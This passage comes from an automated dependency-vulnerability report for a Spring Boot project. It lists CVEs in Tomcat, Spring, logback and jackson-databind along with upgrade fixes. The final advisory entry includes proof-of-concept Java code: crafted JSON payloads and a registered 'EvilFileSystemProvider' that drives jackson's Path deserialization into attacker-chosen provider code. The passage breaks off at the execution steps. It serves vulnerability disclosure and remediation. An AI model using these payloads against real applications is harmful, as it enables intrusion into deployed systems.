Recommended fix:
  - com.jayway.jsonpath:json-path: upgrade to 2.9.0 or a compatible unaffected release; verify the range and release branch; update the direct root/BOM when transitive.

### CVE-2024-12798: QOS.CH logback-core Expression Language Injection vulnerability
- **Category:** CVE
- **Severity:** optional
- **Story Points:** 1
- **Files:** pom.xml:32

[CVE-2024-12798](https://github.com/advisories/GHSA-pr98-23f8-jwxv): QOS.CH logback-core Expression Language Injection vulnerability

GHSA: GHSA-pr98-23f8-jwxv
Severity: MEDIUM

ACE vulnerability in JaninoEventEvaluator by QOS.CH logback-core up to and including version 1.5.12 in Java applications allows attackers to execute arbitrary code by compromising an existing logback configuration file or by injecting an environment variable before program execution.

Malicious logback configuration files can allow the attacker to execute arbitrary code using the JaninoEventEvaluator extension.

A successful attack requires the user to have write access to a configuration file. Alternatively, the attacker could inject a malicious environment variable pointing to a malicious configuration file. In both cases, the attack requires existing privilege.

Affected dependencies (Maven dependency:tree, including compile/runtime/test and optional dependencies):
  - ch.qos.logback:logback-core:1.2.12; affected range: < 1.3.15
    - Transitive; pulled by direct root declared at pom.xml:32; scope: compile; full resolved chain: org.springframework.boot:spring-boot-starter-web:2.7.18 -> org.springframework.boot:spring-boot-starter:2.7.18 -> org.springframework.boot:spring-boot-starter-logging:2.7.18 -> ch.qos.logback:logback-classic:1.2.12 -> ch.qos.logback:logback-core:1.2.12

Recommended fix:
  - ch.qos.logback:logback-core: upgrade to 1.3.15 or a compatible unaffected release; verify the range and release branch; update the direct root/BOM when transitive.

### CVE-2024-23672: Denial of Service via incomplete cleanup vulnerability in Apache Tomcat
- **Category:** CVE
- **Severity:** optional
- **Story Points:** 1
- **Files:** pom.xml:32

[CVE-2024-23672](https://github.com/advisories/GHSA-v682-8vv8-vpwr): Denial of Service via incomplete cleanup vulnerability in Apache Tomcat

GHSA: GHSA-v682-8vv8-vpwr
Severity: MEDIUM

Denial of Service via incomplete cleanup vulnerability in Apache Tomcat. It was possible for WebSocket clients to keep WebSocket connections open leading to increased resource consumption.This issue affects Apache Tomcat: from 11.0.0-M1 through 11.0.0-M16, from 10.1.0-M1 through 10.1.18, from 9.0.0-M1 through 9.0.85, from 8.5.0 through 8.5.98. Older, EOL versions may also be affected.

Users are recommended to upgrade to version 11.0.0-M17, 10.1.19, 9.0.86 or 8.5.99 which fix the issue.

Affected dependencies (Maven dependency:tree, including compile/runtime/test and optional dependencies):
  - org.apache.tomcat.embed:tomcat-embed-websocket:9.0.83; affected range: >= 9.0.0-M1, <= 9.0.85
    - Transitive; pulled by direct root declared at pom.xml:32; scope: compile; full resolved chain: org.springframework.boot:spring-boot-starter-web:2.7.18 -> org.springframework.boot:spring-boot-starter-tomcat:2.7.18 -> org.apache.tomcat.embed:tomcat-embed-websocket:9.0.83

Recommended fix:
  - org.apache.tomcat.embed:tomcat-embed-websocket: upgrade to 9.0.86 or a compatible unaffected release; verify the range and release branch; update the direct root/BOM when transitive.

### CVE-2024-24549: Apache Tomcat Denial of Service due to improper input validation vulnerability for HTTP/2 requests
- **Category:** CVE
- **Severity:** optional
- **Story Points:** 1
- **Files:** pom.xml:32

[CVE-2024-24549](https://github.com/advisories/GHSA-7w75-32cg-r6g2): Apache Tomcat Denial of Service due to improper input validation vulnerability for HTTP/2 requests

GHSA: GHSA-7w75-32cg-r6g2
Severity: MEDIUM

Denial of Service due to improper input validation vulnerability for HTTP/2 requests in Apache Tomcat. When processing an HTTP/2 request, if the request exceeded any of the configured limits for headers, the associated HTTP/2 stream was not reset until after all of the headers had been processed.This issue affects Apache Tomcat: from 11.0.0-M1 through 11.0.0-M16, from 10.1.0-M1 through 10.1.18, from 9.0.0-M1 through 9.0.85, from 8.5.0 through 8.5.98.

Users are recommended to upgrade to version 11.0.0-M17, 10.1.19, 9.0.86 or 8.5.99 which fix the issue.

Affected dependencies (Maven dependency:tree, including compile/runtime/test and optional dependencies):
  - org.apache.tomcat.embed:tomcat-embed-core:9.0.83; affected range: >= 9.0.0-M1, <= 9.0.85
    - Transitive; pulled by direct root declared at pom.xml:32; scope: compile; full resolved chain: org.springframework.boot:spring-boot-starter-web:2.7.18 -> org.springframework.boot:spring-boot-starter-tomcat:2.7.18 -> org.apache.tomcat.embed:tomcat-embed-core:9.0.83

Recommended fix:
  - org.apache.tomcat.embed:tomcat-embed-core: upgrade to 9.0.86 or a compatible unaffected release; verify the range and release branch; update the direct root/BOM when transitive.

### CVE-2024-38808: Spring Framework vulnerable to Denial of Service
- **Category:** CVE
- **Severity:** optional
- **Story Points:** 1
- **Files:** pom.xml:32

[CVE-2024-38808](https://github.com/advisories/GHSA-9cmq-m9j5-mvww): Spring Framework vulnerable to Denial of Service

GHSA: GHSA-9cmq-m9j5-mvww
Severity: MEDIUM

In Spring Framework versions 5.3.0 - 5.3.38 and older unsupported versions, it is possible for a user to provide a specially crafted Spring Expression Language (SpEL) expression that may cause a denial of service (DoS) condition. Older, unsupported versions are also affected.

Specifically, an application is vulnerable when the following is true:

  *  The application evaluates user-supplied SpEL expressions.

Affected dependencies (Maven dependency:tree, including compile/runtime/test and optional dependencies):
  - org.springframework:spring-expression:5.3.31; affected range: < 5.3.39
    - Transitive; pulled by direct root declared at pom.xml:32; scope: compile; full resolved chain: org.springframework.boot:spring-boot-starter-web:2.7.18 -> org.springframework:spring-webmvc:5.3.31 -> org.springframework:spring-expression:5.3.31

Recommended fix:
  - org.springframework:spring-expression: upgrade to 5.3.39 or a compatible unaffected release; verify the range and release branch; update the direct root/BOM when transitive.

### CVE-2024-38809: Spring Framework DoS via conditional HTTP request
- **Category:** CVE
- **Severity:** optional
- **Story Points:** 1
- **Files:** pom.xml:32

[CVE-2024-38809](https://github.com/advisories/GHSA-2rmj-mq67-h97g): Spring Framework DoS via conditional HTTP request

GHSA: GHSA-2rmj-mq67-h97g
Severity: MEDIUM

### Description
Applications that parse ETags from `If-Match` or `If-None-Match` request headers are vulnerable to DoS attack.

### Affected Spring Products and Versions
org.springframework:spring-web in versions 

6.1.0 through 6.1.11
6.0.0 through 6.0.22
5.3.0 through 5.3.37

Older, unsupported versions are also affected

### Mitigation
Users of affected versions should upgrade to the corresponding fixed version.
6.1.x -> 6.1.12
6.0.x -> 6.0.23
5.3.x -> 5.3.38
No other mitigation steps are necessary.

Users of older, unsupported versions could enforce a size limit on `If-Match` and `If-None-Match` headers, e.g. through a Filter.

Affected dependencies (Maven dependency:tree, including compile/runtime/test and optional dependencies):
  - org.springframework:spring-web:5.3.31; affected range: < 5.3.38
    - Transitive; pulled by direct root declared at pom.xml:32; scope: compile; full resolved chain: org.springframework.boot:spring-boot-starter-web:2.7.18 -> org.springframework:spring-web:5.3.31

Recommended fix:
  - org.springframework:spring-web: upgrade to 5.3.38 or a compatible unaffected release; verify the range and release branch; update the direct root/BOM when transitive.

### CVE-2024-38820: Spring Framework DataBinder Case Sensitive Match Exception
- **Category:** CVE
- **Severity:** optional
- **Story Points:** 1
- **Files:** pom.xml:32

[CVE-2024-38820](https://github.com/advisories/GHSA-4gc7-5j7h-4qph): Spring Framework DataBinder Case Sensitive Match Exception

GHSA: GHSA-4gc7-5j7h-4qph
Severity: MEDIUM

The fix for CVE-2022-22968 made disallowedFields patterns in DataBinder case insensitive. However, String.toLowerCase() has some Locale dependent exceptions that could potentially result in fields not protected as expected.

Affected dependencies (Maven dependency:tree, including compile/runtime/test and optional dependencies):
  - org.springframework:spring-context:5.3.31; affected range: <= 5.3.40
    - Transitive; pulled by direct root declared at pom.xml:32; scope: compile; full resolved chain: org.springframework.boot:spring-boot-starter-web:2.7.18 -> org.springframework:spring-webmvc:5.3.31 -> org.springframework:spring-context:5.3.31
  - org.springframework:spring-web:5.3.31; affected range: <= 5.3.40
    - Transitive; pulled by direct root declared at pom.xml:32; scope: compile; full resolved chain: org.springframework.boot:spring-boot-starter-web:2.7.18 -> org.springframework:spring-web:5.3.31

Recommended fix:
  - org.springframework:spring-context: no first patched version provided; consult the advisory for mitigation or an unaffected supported release.
  - org.springframework:spring-web: no first patched version provided; consult the advisory for mitigation or an unaffected supported release.

### CVE-2024-38827: Spring Framework has Authorization Bypass for Case Sensitive Comparisons
- **Category:** CVE
- **Severity:** optional
- **Story Points:** 1
- **Files:** pom.xml:63

[CVE-2024-38827](https://github.com/advisories/GHSA-q3v6-hm2v-pw99): Spring Framework has Authorization Bypass for Case Sensitive Comparisons

GHSA: GHSA-q3v6-hm2v-pw99
Severity: MEDIUM

The usage of String.toLowerCase() and String.toUpperCase() has some Locale dependent exceptions that could potentially result in authorization rules not working properly.

Affected dependencies (Maven dependency:tree, including compile/runtime/test and optional dependencies):
  - org.springframework.security:spring-security-core:5.7.11; affected range: < 5.7.14
    - Transitive; pulled by direct root declared at pom.xml:63; scope: compile; full resolved chain: org.springframework.boot:spring-boot-starter-security:2.7.18 -> org.springframework.security:spring-security-config:5.7.11 -> org.springframework.security:spring-security-core:5.7.11

Recommended fix:
  - org.springframework.security:spring-security-core: upgrade to 5.7.14 or a compatible unaffected release; verify the range and release branch; update the direct root/BOM when transitive.

### CVE-2024-38828: Spring MVC controller vulnerable to a DoS attack
- **Category:** CVE
- **Severity:** optional
- **Story Points:** 1
- **Files:** pom.xml:32

[CVE-2024-38828](https://github.com/advisories/GHSA-w3c8-7r8f-9jp8): Spring MVC controller vulnerable to a DoS attack

GHSA: GHSA-w3c8-7r8f-9jp8
Severity: MEDIUM

Spring MVC controller methods with an @RequestBody byte[] method parameter are vulnerable to a DoS attack.

Affected dependencies (Maven dependency:tree, including compile/runtime/test and optional dependencies):
  - org.springframework:spring-webmvc:5.3.31; affected range: >= 5.3.0, < 5.3.42
    - Transitive; pulled by direct root declared at pom.xml:32; scope: compile; full resolved chain: org.springframework.boot:spring-boot-starter-web:2.7.18 -> org.springframework:spring-webmvc:5.3.31

Recommended fix:
  - org.springframework:spring-webmvc: upgrade to 5.3.42 or a compatible unaffected release; verify the range and release branch; update the direct root/BOM when transitive.

### CVE-2025-11226: QOS.CH logback-core is vulnerable to Arbitrary Code Execution through file processing
- **Category:** CVE
- **Severity:** optional
- **Story Points:** 1
- **Files:** pom.xml:32

[CVE-2025-11226](https://github.com/advisories/GHSA-25qh-j22f-pwp8): QOS.CH logback-core is vulnerable to Arbitrary Code Execution through file processing

GHSA: GHSA-25qh-j22f-pwp8
Severity: MEDIUM

QOS.CH logback-core versions up to 1.5.18 contain an ACE vulnerability in conditional configuration file processing in Java applications. This vulnerability allows an attacker to execute arbitrary code by compromising an existing logback configuration file or by injecting a malicious environment variable before program execution.

A successful attack requires the Janino library and Spring Framework to be present on the user's class path. Additionally, the attacker must have write access to a configuration file. Alternatively, the attacker could inject a malicious environment variable pointing to a malicious configuration file. In both cases, the attack requires existing privileges.

Affected dependencies (Maven dependency:tree, including compile/runtime/test and optional dependencies):
  - ch.qos.logback:logback-core:1.2.12; affected range: < 1.3.16
    - Transitive; pulled by direct root declared at pom.xml:32; scope: compile; full resolved chain: org.springframework.boot:spring-boot-starter-web:2.7.18 -> org.springframework.boot:spring-boot-starter:2.7.18 -> org.springframework.boot:spring-boot-starter-logging:2.7.18 -> ch.qos.logback:logback-classic:1.2.12 -> ch.qos.logback:logback-core:1.2.12

Recommended fix:
  - ch.qos.logback:logback-core: upgrade to 1.3.16 or a compatible unaffected release; verify the range and release branch; update the direct root/BOM when transitive.

### CVE-2025-31650: Apache Tomcat Denial of Service via invalid HTTP priority header
- **Category:** CVE
- **Severity:** optional
- **Story Points:** 1
- **Files:** pom.xml:32

[CVE-2025-31650](https://github.com/advisories/GHSA-3p2h-wqq4-wf4h): Apache Tomcat Denial of Service via invalid HTTP priority header

GHSA: GHSA-3p2h-wqq4-wf4h
Severity: MEDIUM

Improper Input Validation vulnerability in Apache Tomcat. Incorrect error handling for some invalid HTTP priority headers resulted in incomplete clean-up of the failed request which created a memory leak. A large number of such requests could trigger an OutOfMemoryException resulting in a denial of service.

This issue affects Apache Tomcat: from 9.0.76 through 9.0.102, from 10.1.10 through 10.1.39, from 11.0.0-M2 through 11.0.5. The following versions were EOL at the time the CVE was created but are known to be affected: 8.5.90 though 8.5.100.

Users are recommended to upgrade to version 9.0.104, 10.1.40 or 11.0.6 which fix the issue.

Affected dependencies (Maven dependency:tree, including compile/runtime/test and optional dependencies):
  - org.apache.tomcat.embed:tomcat-embed-core:9.0.83; affected range: >= 9.0.76, <= 9.0.102
    - Transitive; pulled by direct root declared at pom.xml:32; scope: compile; full resolved chain: org.springframework.boot:spring-boot-starter-web:2.7.18 -> org.springframework.boot:spring-boot-starter-tomcat:2.7.18 -> org.apache.tomcat.embed:tomcat-embed-core:9.0.83

Recommended fix:
  - org.apache.tomcat.embed:tomcat-embed-core: upgrade to 9.0.104 or a compatible unaffected release; verify the range and release branch; update the direct root/BOM when transitive.

### CVE-2025-41242: Spring Framework MVC Applications Path Traversal Vulnerability
- **Category:** CVE
- **Severity:** optional
- **Story Points:** 1
- **Files:** pom.xml:32

[CVE-2025-41242](https://github.com/advisories/GHSA-r936-gwx5-v52f): Spring Framework MVC Applications Path Traversal Vulnerability

GHSA: GHSA-r936-gwx5-v52f
Severity: MEDIUM

Spring Framework MVC applications can be vulnerable to a “Path Traversal Vulnerability” when deployed on a non-compliant Servlet container.

An application can be vulnerable when all the following are true:

  *  the application is deployed as a WAR or with an embedded Servlet container
  *  the Servlet container  does not reject suspicious sequences https://jakarta.ee/specifications/servlet/6.1/jakarta-servlet-spec-6.1.html#uri-path-canonicalization 
  *  the application  serves static resources https://docs.spring.io/spring-framework/reference/web/webmvc/mvc-config/static-resources.html#page-title  with Spring resource handling


We have verified that applications deployed on Apache Tomcat or Eclipse Jetty are not vulnerable, as long as default security features are not disabled in the configuration. Because we cannot check exploits against all Servlet containers and configuration variants, we strongly recommend upgrading your application.

Affected dependencies (Maven dependency:tree, including compile/runtime/test and optional dependencies):
  - org.springframework:spring-webmvc:5.3.31; affected range: >= 5.3.0, <= 5.3.43
    - Transitive; pulled by direct root declared at pom.xml:32; scope: compile; full resolved chain: org.springframework.boot:spring-boot-starter-web:2.7.18 -> org.springframework:spring-webmvc:5.3.31

Recommended fix:
  - org.springframework:spring-webmvc: no first patched version provided; consult the advisory for mitigation or an unaffected supported release.

### CVE-2025-49124: Apache Tomcat installer for Windows has an untrusted search path vulnerability
- **Category:** CVE
- **Severity:** optional
- **Story Points:** 1
- **Files:** pom.xml:32

[CVE-2025-49124](https://github.com/advisories/GHSA-42wg-hm62-jcwg): Apache Tomcat installer for Windows has an untrusted search path vulnerability

GHSA: GHSA-42wg-hm62-jcwg
Severity: MEDIUM

Untrusted Search Path vulnerability in Apache Tomcat installer for Windows. During installation, the Tomcat installer for Windows used icacls.exe without specifying a full path.

This issue affects Apache Tomcat: from 11.0.0-M1 through 11.0.7, from 10.1.0 through 10.1.41, from 9.0.23 through 9.0.105.

Users are recommended to upgrade to version 11.0.8, 10.1.42 or 9.0.106, which fix the issue.

Affected dependencies (Maven dependency:tree, including compile/runtime/test and optional dependencies):
  - org.apache.tomcat.embed:tomcat-embed-core:9.0.83; affected range: >= 9.0.23, < 9.0.106
    - Transitive; pulled by direct root declared at pom.xml:32; scope: compile; full resolved chain: org.springframework.boot:spring-boot-starter-web:2.7.18 -> org.springframework.boot:spring-boot-starter-tomcat:2.7.18 -> org.apache.tomcat.embed:tomcat-embed-core:9.0.83

Recommended fix:
  - org.apache.tomcat.embed:tomcat-embed-core: upgrade to 9.0.106 or a compatible unaffected release; verify the range and release branch; update the direct root/BOM when transitive.

### CVE-2025-49125: Apache Tomcat - Security constraint bypass for pre/post-resources
- **Category:** CVE
- **Severity:** optional
- **Story Points:** 1
- **Files:** pom.xml:32

[CVE-2025-49125](https://github.com/advisories/GHSA-wc4r-xq3c-5cf3): Apache Tomcat - Security constraint bypass for pre/post-resources

GHSA: GHSA-wc4r-xq3c-5cf3
Severity: MEDIUM

Authentication Bypass Using an Alternate Path or Channel vulnerability in Apache Tomcat.  When using PreResources or PostResources mounted other than at the root of the web application, it was possible to access those resources via an unexpected path. That path was likely not to be protected by the same security constraints as the expected path, allowing those security constraints to be bypassed.

This issue affects Apache Tomcat: from 11.0.0-M1 through 11.0.7, from 10.1.0-M1 through 10.1.41, from 9.0.0.M1 through 9.0.105. The following versions were EOL at the time the CVE was created but are known to be affected: 8.5.0 through 8.5.100. Other, older, EOL versions may also be affected.

Users are recommended to upgrade to version 11.0.8, 10.1.42 or 9.0.106, which fix the issue.

Affected dependencies (Maven dependency:tree, including compile/runtime/test and optional dependencies):
  - org.apache.tomcat.embed:tomcat-embed-core:9.0.83; affected range: >= 9.0.0.M1, <= 9.0.105
    - Transitive; pulled by direct root declared at pom.xml:32; scope: compile; full resolved chain: org.springframework.boot:spring-boot-starter-web:2.7.18 -> org.springframework.boot:spring-boot-starter-tomcat:2.7.18 -> org.apache.tomcat.embed:tomcat-embed-core:9.0.83

Recommended fix:
  - org.apache.tomcat.embed:tomcat-embed-core: upgrade to 9.0.106 or a compatible unaffected release; verify the range and release branch; update the direct root/BOM when transitive.

### CVE-2025-52434: Apache Tomcat is vulnerable to resource exhaustion when using the APR/Native connector
- **Category:** CVE
- **Severity:** optional
- **Story Points:** 1
- **Files:** pom.xml:32

[CVE-2025-52434](https://github.com/advisories/GHSA-4j3c-42xv-3f84): Apache Tomcat is vulnerable to resource exhaustion when using the APR/Native connector

GHSA: GHSA-4j3c-42xv-3f84
Severity: MEDIUM

Concurrent Execution using Shared Resource with Improper Synchronization ('Race Condition') vulnerability in Apache Tomcat when using the APR/Native connector. This was particularly noticeable with client initiated closes of HTTP/2 connections.

This issue affects Apache Tomcat: from 9.0.0.M1 through 9.0.106.  The following versions were EOL at the time the CVE was created but are known to be affected: 8.5.0 through 8.5.100. Other, older, EOL versions may also be affected.

Users are recommended to upgrade to version 9.0.107, which fixes the issue.

Affected dependencies (Maven dependency:tree, including compile/runtime/test and optional dependencies):
  - org.apache.tomcat.embed:tomcat-embed-core:9.0.83; affected range: >= 9.0.0.M1, < 9.0.107
    - Transitive; pulled by direct root declared at pom.xml:32; scope: compile; full resolved chain: org.springframework.boot:spring-boot-starter-web:2.7.18 -> org.springframework.boot:spring-boot-starter-tomcat:2.7.18 -> org.apache.tomcat.embed:tomcat-embed-core:9.0.83

Recommended fix:
  - org.apache.tomcat.embed:tomcat-embed-core: upgrade to 9.0.107 or a compatible unaffected release; verify the range and release branch; update the direct root/BOM when transitive.

### CVE-2025-55668: Apache Tomcat Session Fixation vulnerability
- **Category:** CVE
- **Severity:** optional
- **Story Points:** 1
- **Files:** pom.xml:32

[CVE-2025-55668](https://github.com/advisories/GHSA-23hv-mwm6-g8jf): Apache Tomcat Session Fixation vulnerability

GHSA: GHSA-23hv-mwm6-g8jf
Severity: MEDIUM

Session Fixation vulnerability in Apache Tomcat via rewrite valve.

This issue affects Apache Tomcat: from 11.0.0-M1 through 11.0.7, from 10.1.0-M1 through 10.1.41, from 9.0.0.M1 through 9.0.105.
Older, EOL versions may also be affected.

Users are recommended to upgrade to version 11.0.8, 10.1.42 or 9.0.106, which fix the issue.

Affected dependencies (Maven dependency:tree, including compile/runtime/test and optional dependencies):
  - org.apache.tomcat.embed:tomcat-embed-core:9.0.83; affected range: >= 9.0.0.M1, < 9.0.106
    - Transitive; pulled by direct root declared at pom.xml:32; scope: compile; full resolved chain: org.springframework.boot:spring-boot-starter-web:2.7.18 -> org.springframework.boot:spring-boot-starter-tomcat:2.7.18 -> org.apache.tomcat.embed:tomcat-embed-core:9.0.83

Recommended fix:
  - org.apache.tomcat.embed:tomcat-embed-core: upgrade to 9.0.106 or a compatible unaffected release; verify the range and release branch; update the direct root/BOM when transitive.

### CVE-2025-66614: Apache Tomcat - Client certificate verification bypass
- **Category:** CVE
- **Severity:** optional
- **Story Points:** 1
- **Files:** pom.xml:32

[CVE-2025-66614](https://github.com/advisories/GHSA-fpj8-gq4v-p354): Apache Tomcat - Client certificate verification bypass

GHSA: GHSA-fpj8-gq4v-p354
Severity: MEDIUM

Improper Input Validation vulnerability.

This issue affects Apache Tomcat: from 11.0.0-M1 through 11.0.14, from 10.1.0-M1 through 10.1.49, from 9.0.0-M1 through 9.0.112.

The following versions were EOL at the time the CVE was created but are known to be affected: 8.5.0 through 8.5.100. Older EOL versions are not affected. Tomcat did not validate that the host name provided via the SNI extension was the same as the host name provided in the HTTP host header field. If Tomcat was configured with more than one virtual host and the TLS configuration for one of those hosts did not require client certificate authentication but another one did, it was possible for a client to bypass the client certificate authentication by sending different host names in the SNI extension and the HTTP host header field.

The vulnerability only applies if client certificate authentication is only enforced at the Connector. It does not apply if client certificate authentication is enforced at the web application.

Users are recommended to upgrade to version 11.0.15 or later, 10.1.50 or later or 9.0.113 or later, which fix the issue.

Affected dependencies (Maven dependency:tree, including compile/runtime/test and optional dependencies):
  - org.apache.tomcat.embed:tomcat-embed-core:9.0.83; affected range: >= 9.0.0-M1, < 9.0.113
    - Transitive; pulled by direct root declared at pom.xml:32; scope: compile; full resolved chain: org.springframework.boot:spring-boot-starter-web:2.7.18 -> org.springframework.boot:spring-boot-starter-tomcat:2.7.18 -> org.apache.tomcat.embed:tomcat-embed-core:9.0.83

Recommended fix:
  - org.apache.tomcat.embed:tomcat-embed-core: upgrade to 9.0.113 or a compatible unaffected release; verify the range and release branch; update the direct root/BOM when transitive.

### CVE-2026-19032: jackson-databind: Path Deserialization Missing Scheme Allowlist for FileSystemProvider Resolution
- **Category:** CVE
- **Severity:** optional
- **Story Points:** 1
- **Files:** pom.xml:76

[CVE-2026-19032](https://github.com/advisories/GHSA-wjgm-6hv5-3cvf): jackson-databind: Path Deserialization Missing Scheme Allowlist for FileSystemProvider Resolution

GHSA: GHSA-wjgm-6hv5-3cvf
Severity: MEDIUM

### Summary

A `java.nio.file.Path` field bound from untrusted JSON reaches `JDKFromStringDeserializer.NioPathHelper.deserialize`. The attacker string flows through `new URI(value)` → `Path.of(uri)`, then on `FileSystemNotFoundException` into a `ServiceLoader<FileSystemProvider>` enumeration that calls `provider.getPath(uri)` on the first scheme-matching provider. No scheme is rejected, so untrusted JSON can drive an arbitrary registered provider under the default `JsonMapper.builder().build()`.

Impact is bounded. The JDK built-in providers (`file`, `jar`/zipfs) do no network I/O and do not mount, so the path is inert without a side-effecting third-party provider. Binding `Path` from untrusted input is already an anti-pattern.

### Description

`NioPathHelper.deserialize` performs provider resolution driven by the attacker URI (abridged; the real method also handles a Windows drive-letter prefix and wraps failures via `ctxt.handleInstantiationProblem(...)`):

```java
int colonIx = value.indexOf(':');
if (colonIx < 0) { return Path.of(value); }
...
final URI uri = new URI(value);          // attacker-controlled URI string
try {
    return Path.of(uri);                  // resolves scheme -> may load a FileSystemProvider
} catch (FileSystemNotFoundException cause) {
    final String scheme = uri.getScheme();
    for (FileSystemProvider provider : ServiceLoader.load(FileSystemProvider.class)) {
        if (provider.getScheme().equalsIgnoreCase(scheme)) {
            return provider.getPath(uri);  // attacker scheme selects & drives a provider
        }
    }
    // no matching provider -> ctxt.handleInstantiationProblem(...) (throws by default)
}
```

The attacker's scheme selects the provider and the attacker's URI is passed to it; the enumeration also forces provider classloading during `readValue`. For built-in schemes like `jar:`, `getPath` throws `FileSystemNotFoundException` (a mount requires explicit `newFileSystem`), surfacing as a wrapped `ValueInstantiationException` with no terminal effect. Any mount, network I/O, or resource access depends entirely on the selected provider.

## Vulnerable Code Location

- `src/main/java/tools/jackson/databind/deser/jdk/JDKFromStringDeserializer.java`
  - `STD_PATH` → `NioPathHelper.deserialize`; `NioPathHelper.deserialize` body 
       (`new URI` → `Path.of(uri)` → `ServiceLoader.load(FileSystemProvider.class)` → `provider.getPath(uri)`).


## Proof of Concept

Two PoCs are provided. 

> PoC 2 registers a custom `FileSystemProvider` to show that attacker JSON reaches `provider.getPath(attackerURI)` inside `readValue`. Whether a third-party provider then does anything harmful is outside the library's control. The in-scope issue is **PoC 1** — the `jar:`/arbitrary-scheme path reaching the `ServiceLoader` fallback with no scheme restriction.

**PoC 1 — sink reached (built-in `jar` provider).** 

`com/poc/Vuln04_PathProvider.java`:
```java
package com.poc;

import tools.jackson.databind.ObjectMapper;
import tools.jackson.databind.json.JsonMapper;
import java.nio.file.Path;

/**
 * Vuln 4: java.nio.file.Path deserialization resolves an attacker URI via
 * Path.of(uri) / ServiceLoader<FileSystemProvider>.
 */
public class Vuln04_PathProvider {
    public static class Config { public Path workdir; }

    public static void main(String[] args) throws Exception {
        ObjectMapper mapper = JsonMapper.builder().build();
        // jar: scheme forces FileSystemProvider resolution / mounting attempt on attacker URI.
        String json = "{\"workdir\":\"jar:file:/tmp/jackson_poc_evil.zip!/x\"}";
        System.out.println("Deserializing (default mapper): " + json);
        try {
            Config c = mapper.readValue(json, Config.class);
            System.out.println("Resolved Path = " + c.workdir + "  (class=" + (c.workdir==null?"null":c.workdir.getClass().getName()) + ")");
            System.out.println("RESULT: VULNERABLE - attacker URI scheme resolved through provider machinery during readValue");
        } catch (Throwable t) {
            System.out.println("Throwable during resolution: " + t.getClass().getName() + ": " + t.getMessage());
            System.out.println("RESULT: VULNERABLE (attacker URI drove provider resolution; threw " + t.getClass().getSimpleName() + " inside readValue)");
        }
    }
}
```

**PoC 2 — scheme-selection mechanism demo (custom `FileSystemProvider`).**
A third-party provider (scheme `evilscheme`) registered via `META-INF/services/java.nio.file.spi.FileSystemProvider`, which is standing in for *any* provider a real application ships. 

`com/poc/EvilFileSystemProvider.java`:
```java
package com.poc;

import java.nio.file.*;
import java.nio.file.spi.FileSystemProvider;
import java.nio.file.attribute.*;
import java.net.URI;
import java.io.IOException;
import java.util.*;
import java.util.Set;
import java.nio.channels.SeekableByteChannel;

/**
 * A custom java.nio.file.spi.FileSystemProvider registered via META-INF/services, using the
 * scheme "evilscheme". It stands in for ANY third-party FileSystemProvider present on a real
 * application's classpath. Its static initializer and getPath() record that they executed,
 * proving that attacker-controlled JSON drove provider class loading + provider.getPath(uri)
 * inside jackson's readValue.
 */
public class EvilFileSystemProvider extends FileSystemProvider {
    public static volatile boolean STATIC_INIT_RAN = false;
    public static volatile String GET_PATH_URI = null;
    static { STATIC_INIT_RAN = true; }

    @Override public String getScheme() { return "evilscheme"; }

    @Override public Path getPath(URI uri) {
        GET_PATH_URI = uri.toString();
        System.out.println(">>> [EVIL-PROVIDER] getPath() invoked with attacker URI: " + uri);
        // A malicious/vulnerable provider could here open a socket, read a file, mount a FS, etc.
        return java.nio.file.Path.of(System.getProperty("java.io.tmpdir"), "evilprovider-marker");
    }

    // --- remaining abstract methods: minimal stubs ---
    @Override public FileSystem newFileSystem(URI uri, Map<String,?> env) { throw new UnsupportedOperationException(); }
    @Override public FileSystem getFileSystem(URI uri) { throw new FileSystemNotFoundException(); }
    @Override public SeekableByteChannel newByteChannel(Path p, Set<? extends OpenOption> o, FileAttribute<?>... a) throws IOException { throw new UnsupportedOperationException(); }
    @Override public DirectoryStream<Path> newDirectoryStream(Path d, DirectoryStream.Filter<? super Path> f) { throw new UnsupportedOperationException(); }
    @Override public void createDirectory(Path d, FileAttribute<?>... a) { throw new UnsupportedOperationException(); }
    @Override public void delete(Path p) { throw new UnsupportedOperationException(); }
    @Override public void copy(Path s, Path t, CopyOption... o) { throw new UnsupportedOperationException(); }
    @Override public void move(Path s, Path t, CopyOption... o) { throw new UnsupportedOperationException(); }
    @Override public boolean isSameFile(Path p, Path p2) { return false; }
    @Override public boolean isHidden(Path p) { return false; }
    @Override public FileStore getFileStore(Path p) { throw new UnsupportedOperationException(); }
    @Override public void checkAccess(Path p, AccessMode... m) { }
    @Override public <V extends FileAttributeView> V getFileAttributeView(Path p, Class<V> t, LinkOption... o) { return null; }
    @Override public <A extends BasicFileAttributes> A readAttributes(Path p, Class<A> t, LinkOption... o) { throw new UnsupportedOperationException(); }
    @Override public Map<String,Object> readAttributes(Path p, String a, LinkOption... o) { throw new UnsupportedOperationException(); }
    @Override public void setAttribute(Path p, String a, Object v, LinkOption... o) { }
}
```

Registration descriptor —
`src/main/resources/META-INF/services/java.nio.file.spi.FileSystemProvider`:
```
com.poc.EvilFileSystemProvider
```

Driver — `com/poc/Vuln04b_PathProviderMount.java`:
```java
package com.poc;

import tools.jackson.databind.ObjectMapper;
import tools.jackson.databind.json.JsonMapper;

/**
 * Vuln 4 (end-to-end terminal effect): a third-party FileSystemProvider registered via
 * META-INF/services (scheme "evilscheme") stands in for any provider on a real app's
 * classpath. Attacker JSON with that scheme drives jackson's ServiceLoader fallback to
 * (1) load the provider class (running its static initializer) and (2) invoke
 * provider.getPath(attackerUri) -- all inside readValue, with NO application code.
 */
public class Vuln04b_PathProviderMount {
    public static class Config { public java.nio.file.Path workdir; }

    public static void main(String[] args) throws Exception {
        System.out.println("Provider static-init ran before deserialization? " + EvilFileSystemProvider.STATIC_INIT_RAN);
        ObjectMapper mapper = JsonMapper.builder().build();   // default config
        String json = "{\"workdir\":\"evilscheme://attacker-controlled/target?x=1\"}";
        System.out.println("Deserializing (default mapper): " + json);

        Config c = mapper.readValue(json, Config.class);

        System.out.println("Resolved Path = " + c.workdir);
        System.out.println("Provider static-init ran: " + EvilFileSystemProvider.STATIC_INIT_RAN);
        System.out.println("Provider.getPath() attacker URI: " + EvilFileSystemProvider.GET_PATH_URI);
        boolean ok = EvilFileSystemProvider.GET_PATH_URI != null
                && EvilFileSystemProvider.GET_PATH_URI.contains("attacker-controlled");
        System.out.println(ok
            ? "RESULT: VULNERABLE - attacker JSON drove ServiceLoader provider load + provider.getPath(attackerUri) inside readValue (terminal effect proven)"
            : "RESULT: NOT reproduced");
    }
}
```

## Execution Steps

The PoCs need only the three Jackson 3.2.1 jars on the classpath and can be built with plain `javac`/`java` . PoC 2 additionally requires the `META-INF/services` descriptor to be on the **runtime** classpath

```bash
